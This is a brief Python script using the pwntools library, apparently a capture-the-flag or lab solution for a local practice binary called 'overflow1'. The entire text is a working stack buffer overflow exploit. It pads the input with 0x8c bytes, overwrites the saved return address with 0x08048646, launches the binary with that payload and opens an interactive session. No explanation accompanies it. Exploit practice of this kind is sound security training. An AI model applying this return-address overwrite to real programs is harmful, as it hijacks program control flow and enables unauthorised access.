from pwn import *

ret = 0x08048646
buf = 'a'*0x8c
buf += p32(ret)

a = process(['./overflow1', buf])

a.interactive()